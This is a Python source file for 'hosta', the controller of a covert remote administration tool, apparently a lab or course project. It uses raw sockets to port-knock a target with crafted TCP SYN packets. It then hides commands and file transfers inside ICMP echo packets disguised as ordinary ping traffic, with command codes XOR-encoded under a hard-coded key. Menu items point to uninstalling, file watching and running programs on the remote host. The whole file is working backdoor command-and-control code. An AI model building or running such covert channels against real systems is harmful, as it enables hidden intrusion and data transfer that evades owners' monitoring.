"""hosta: control center for the remote administration tool.

Usage:
    sudo python3 hosta.py -a <hostb_ip>
"""

import argparse
import os
import socket
import struct
import sys
import time
from dataclasses import dataclass


KNOCK_PORTS = (7000, 8000, 9000)
KNOCK_DELAY_SECONDS = 0.1
SOURCE_PORT = 54321
TTL = 64
ACK_TIMEOUT_SECONDS = 5.0
TCP_ACK_FLAG = 0x10

# Command-channel protocol: command code goes in the ICMP identifier
# (16 bits, XOR-encrypted with PRE_SHARED_KEY); sequence in the ICMP
# sequence field in cleartext.
PRE_SHARED_KEY = 0xA5C3
CMD_DISCONNECT = 1
CMD_TRANSFER_FILE = 2
ACK_READY = 0xFFFE

# File transfer settings (block-based protocol with per-block ack).
BLOCK_BYTES = 10000                          # bytes per block; keeps each burst under the raw-socket buffer
MAX_FILENAME_BYTES = 0xFF                    # sanity cap for filename length
READY_TIMEOUT_SECONDS = 5.0
BLOCK_ACK_TIMEOUT_SECONDS = 60.0
FILE_PACKET_DELAY_SECONDS = 0

# Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
# 0x10..0x3F filler pattern. hostb ignores this payload — it only reads
# the identifier and sequence header fields.
PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))

MENU_OPTIONS = (
    "Connect to hostb",
    "Disconnect from hostb",
    "Uninstall from hostb",
    "Transfer file to hostb",
    "Transfer file from hostb",
    "Watch file on hostb",
    "Watch directory on hostb",
    "Run program on hostb",
)


@dataclass
class HostaArgs:
    hostb_ip: str


@dataclass
class Context:
    args: HostaArgs | None = None
    error_message: str | None = None
    error_code: int = 1
    destination_ip: str = ""
    source_ip: str = ""
    connected: bool = False


# ---------------------------------------------------------------------------
# Protocol helpers
# ---------------------------------------------------------------------------

def detect_source_ip(destination_ip):
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((destination_ip, 1))
        return probe.getsockname()[0]
    finally:
        probe.close()


def compute_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def build_ip_header(source_ip, destination_ip, total_length, protocol=socket.IPPROTO_TCP):
    def with_checksum(checksum):
        return struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                     # version 4, header length 5 (20 bytes)
            0,                        # type of service
            total_length,
            0,                        # identification
            0,                        # flags + fragment offset
            TTL,
            protocol,
            checksum,
            socket.inet_aton(source_ip),
            socket.inet_aton(destination_ip),
        )
    return with_checksum(compute_checksum(with_checksum(0)))


def build_tcp_syn_header(source_ip, destination_ip, destination_port):
    def with_checksum(checksum):
        return struct.pack(
            "!HHLLBBHHH",
            SOURCE_PORT,
            destination_port,
            0,                        # sequence number
            0,                        # ack number
            0x50,                     # data offset 5 (20 bytes), reserved 0
            0x02,                     # flags: SYN only
            65535,                    # window
            checksum,
            0,                        # urgent pointer
        )
    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(destination_ip),
        0,
        socket.IPPROTO_TCP,
        20,                           # TCP header length
    )
    return with_checksum(compute_checksum(pseudo + with_checksum(0)))


def build_icmp_echo_request(identifier_encrypted, sequence):
    def with_checksum(checksum):
        header = struct.pack(
            "!BBHHH",
            8,                         # type: echo request
            0,                         # code
            checksum,
            identifier_encrypted,
            sequence,
        )
        return header + PING_PAYLOAD
    return with_checksum(compute_checksum(with_checksum(0)))


def encrypt_identifier(plaintext):
    return (plaintext ^ PRE_SHARED_KEY) & 0xFFFF


def decrypt_identifier(ciphertext):
    return (ciphertext ^ PRE_SHARED_KEY) & 0xFFFF


def open_raw_send_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return sock


def send_icmp_identifier(send_socket, source_ip, destination_ip, identifier_encrypted, sequence):
    icmp = build_icmp_echo_request(identifier_encrypted, sequence)
    ip = build_ip_header(source_ip, destination_ip, 20 + len(icmp), socket.IPPROTO_ICMP)
    send_socket.sendto(ip + icmp, (destination_ip, 0))


def wait_for_ready_ack(recv_socket, expected_source_ip, timeout_seconds):
    deadline = time.time() + timeout_seconds
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return False
        recv_socket.settimeout(remaining)
        try:
            packet, _ = recv_socket.recvfrom(65535)
        except socket.timeout:
            return False

        if len(packet) < 28:
            continue
        ip_header_length = (packet[0] & 0x0F) * 4
        if len(packet) < ip_header_length + 8:
            continue
        if socket.inet_ntoa(packet[12:16]) != expected_source_ip:
            continue

        icmp_header = packet[ip_header_length:ip_header_length + 8]
        icmp_type, _code, _chk, identifier, _seq = struct.unpack("!BBHHH", icmp_header)
        if icmp_type != 8:
            continue
        if decrypt_identifier(identifier) == ACK_READY:
            return True


# ---------------------------------------------------------------------------
# FSM state functions
# ---------------------------------------------------------------------------

def handle_error(ctx: Context):
    sys.stderr.write(f"\nError: {ctx.error_message}\n")
    sys.stderr.write(f"Exit Code: {ctx.error_code}\n")
    sys.exit(ctx.error_code)


def parse_arguments(ctx: Context, argv: list[str] | None = None):
    parser = argparse.ArgumentParser(
        prog="hosta",
        description="Control center for the remote administration tool.",
    )
    parser.add_argument("-a", dest="hostb_ip", required=True,
                        metavar="<hostb_ip>",
                        help="IP address of hostb")

    try:
        parsed = parser.parse_args(argv)
    except SystemExit as exc:
        sys.exit(1 if exc.code else 0)

    ctx.args = HostaArgs(hostb_ip=parsed.hostb_ip)


def handle_arguments(ctx: Context):
    try:
        socket.inet_aton(ctx.args.hostb_ip)
    except OSError:
        ctx.error_message = f"invalid ip address: {ctx.args.hostb_ip}"
        handle_error(ctx)
    ctx.destination_ip = ctx.args.hostb_ip


def display_menu(ctx: Context) -> str:
    state_label = "connected" if ctx.connected else "disconnected"
    print(f"\n--- Menu ({state_label}) ---")
    for index, label in enumerate(MENU_OPTIONS, start=1):
        print(f"  {index}) {label}")
    try:
        return input("choice> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return "exit"


def establish_session(ctx: Context):
    if ctx.connected:
        print("Already connected.")
        return

    ctx.source_ip = detect_source_ip(ctx.destination_ip)

    # Open the recv socket first so we don't miss an ack that arrives
    # before we finish sending the knocks.
    try:
        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        print(f"Knocking {ctx.destination_ip} from {ctx.source_ip}")
        for index, port in enumerate(KNOCK_PORTS):
            if index > 0:
                time.sleep(KNOCK_DELAY_SECONDS)
            tcp = build_tcp_syn_header(ctx.source_ip, ctx.destination_ip, port)
            ip = build_ip_header(ctx.source_ip, ctx.destination_ip, 20 + len(tcp))
            send_socket.sendto(ip + tcp, (ctx.destination_ip, port))
            print(f"  SYN -> {ctx.destination_ip}:{port}")

        print("Waiting for ack...")
        deadline = time.time() + ACK_TIMEOUT_SECONDS
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                print("Connection failed: no ack from hostb.")
                return
            recv_socket.settimeout(remaining)
            try:
                packet, _ = recv_socket.recvfrom(65535)
            except socket.timeout:
                print("Connection failed: no ack from hostb.")
                return

            if len(packet) < 40:
                continue
            ip_header_length = (packet[0] & 0x0F) * 4
            if len(packet) < ip_header_length + 20:
                continue
            if socket.inet_ntoa(packet[12:16]) != ctx.destination_ip:
                continue

            tcp_header = packet[ip_header_length:ip_header_length + 20]
            _, dst_port, _, _, _, flags, _, _, _ = struct.unpack("!HHLLBBHHH", tcp_header)
            if dst_port != SOURCE_PORT:
                continue
            if flags & TCP_ACK_FLAG:
                print("Connection established.")
                ctx.connected = True
                return
    finally:
        recv_socket.close()
        send_socket.close()


def send_command(ctx: Context, command_code: int):
    if not ctx.connected:
        print("Not connected. Use option 1 first.")
        return

    try:
        raw_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        identifier = encrypt_identifier(command_code)
        sequence = 1
        try:
            send_icmp_identifier(raw_socket, ctx.source_ip, ctx.destination_ip, identifier, sequence)
        except OSError as exc:
            ctx.error_message = f"failed to send command: {exc}"
            ctx.error_code = 2
            handle_error(ctx)

        print(
            f"ICMP -> {ctx.destination_ip} "
            f"id={identifier:#06x} (cmd={command_code}) seq={sequence}"
        )
        if command_code == CMD_DISCONNECT:
            ctx.connected = False
            print("Disconnect command sent.")
    finally:
        raw_socket.close()


def transfer_file(ctx: Context):
    if not ctx.connected:
        print("Not connected. Use option 1 first.")
        return

    try:
        source_path = input("file path> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    if not source_path:
        print("Transfer cancelled: no path given.")
        return

    try:
        with open(source_path, "rb") as f:
            file_bytes = f.read()
    except FileNotFoundError:
        print(f"Transfer failed: file not found: {source_path}")
        return
    except (IsADirectoryError, PermissionError) as exc:
        print(f"Transfer failed: cannot read {source_path}: {exc}")
        return
    except OSError as exc:
        print(f"Transfer failed: cannot read {source_path}: {exc}")
        return

    file_size = len(file_bytes)
    if file_size == 0:
        print(f"Transfer skipped: {source_path} is empty.")
        return

    filename = os.path.basename(source_path)
    filename_bytes = filename.encode("utf-8")
    filename_length = len(filename_bytes)
    if filename_length == 0 or filename_length > MAX_FILENAME_BYTES:
        print(f"Transfer failed: invalid filename '{filename}' ({filename_length} bytes)")
        return

    # Stream = [filename_length (2-byte BE)] + [filename utf-8] + [file data].
    # That whole stream is what we split into blocks; hostb reverses the
    # split on the other side.
    stream = struct.pack(">H", filename_length) + filename_bytes + file_bytes
    stream_size = len(stream)
    num_blocks = (stream_size + BLOCK_BYTES - 1) // BLOCK_BYTES

    print(f"File: {source_path}")
    print(f"  Name:    '{filename}' ({filename_length} bytes)")
    print(f"  Content: {file_size} bytes")
    print(f"  Stream:  {stream_size} bytes -> {num_blocks} block(s) of <= {BLOCK_BYTES} bytes")

    try:
        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    def send_or_die(identifier_value: int, sequence: int, label: str) -> None:
        try:
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(identifier_value), sequence,
            )
        except OSError as exc:
            ctx.error_message = f"failed to send {label}: {exc}"
            ctx.error_code = 2
            handle_error(ctx)

    try:
        # 1. Initial handshake: CMD_TRANSFER_FILE -> ACK_READY.
        send_or_die(CMD_TRANSFER_FILE, 1, "transfer request")
        print(f"Sent transfer request (cmd={CMD_TRANSFER_FILE}). Waiting for ready ack...")

        if not wait_for_ready_ack(recv_socket, ctx.destination_ip, READY_TIMEOUT_SECONDS):
            print("Transfer failed: no ready ack from hostb.")
            return
        print("hostb is ready. Sending blocks...")

        # 2. Per-block loop: send block header (seq=1) + data (seq=2..K+1),
        #    then wait for ACK_READY before sending the next block.
        for block_index in range(num_blocks):
            block_data = stream[block_index * BLOCK_BYTES:(block_index + 1) * BLOCK_BYTES]
            block_size = len(block_data)
            num_data_packets = (block_size + 1) // 2

            send_or_die(block_size, 1, f"block {block_index + 1} header")
            if FILE_PACKET_DELAY_SECONDS > 0:
                time.sleep(FILE_PACKET_DELAY_SECONDS)

            for chunk_index in range(num_data_packets):
                sequence = chunk_index + 2
                byte_offset = chunk_index * 2
                high = block_data[byte_offset]
                low = block_data[byte_offset + 1] if byte_offset + 1 < block_size else 0
                send_or_die((high << 8) | low, sequence, f"block {block_index + 1} seq={sequence}")
                if FILE_PACKET_DELAY_SECONDS > 0:
                    time.sleep(FILE_PACKET_DELAY_SECONDS)

            print(
                f"  Block {block_index + 1}/{num_blocks}: sent {block_size} bytes "
                f"({num_data_packets + 1} packets); waiting for ack..."
            )
            if not wait_for_ready_ack(
                recv_socket, ctx.destination_ip, BLOCK_ACK_TIMEOUT_SECONDS
            ):
                print(f"Transfer failed: no ack for block {block_index + 1}.")
                return

        # 3. End-of-transfer marker: block header with size=0.
        send_or_die(0, 1, "end-of-transfer marker")
        print(
            f"Transfer complete: sent {num_blocks} block(s), "
            f"{stream_size} bytes including metadata."
        )
    finally:
        recv_socket.close()
        send_socket.close()


if __name__ == "__main__":
    print("--------------- HOSTA ---------------")
    ctx = Context()
    parse_arguments(ctx)
    handle_arguments(ctx)

    print(f"Target: {ctx.destination_ip}")

    while True:
        choice = display_menu(ctx)
        if choice == "exit":
            print("\nExiting.")
            sys.exit(0)

        if choice == "1":
            print("\nEstablishing session...")
            establish_session(ctx)
        elif choice == "2":
            print("\nSending disconnect command...")
            send_command(ctx, CMD_DISCONNECT)
        elif choice == "4":
            print("\nTransferring file to hostb...")
            transfer_file(ctx)
        elif choice in {"3", "5", "6", "7", "8"}:
            print("Not implemented yet.")
        else:
            print("Invalid choice.")
